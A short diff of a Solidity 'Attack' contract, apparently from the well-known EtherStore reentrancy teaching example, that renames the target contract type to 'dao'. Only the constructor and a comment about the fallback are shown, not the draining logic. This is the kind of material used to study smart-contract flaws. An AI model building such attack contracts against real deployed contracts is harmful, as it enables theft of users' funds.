@@ -3,10 +3,10 @@ pragma solidity ^0.7.0;
 import "dao.sol";
 
 contract Attack {
-  EtherStore public etherStore;
+  dao public etherStore;
 
   constructor (address _etherStoreAddress) {
-    etherStore = EtherStore(_etherStoreAddress);
+    etherStore = dao(_etherStoreAddress);
   }
 
   // Fallback is called when EtherStore sends Ether to this contract.
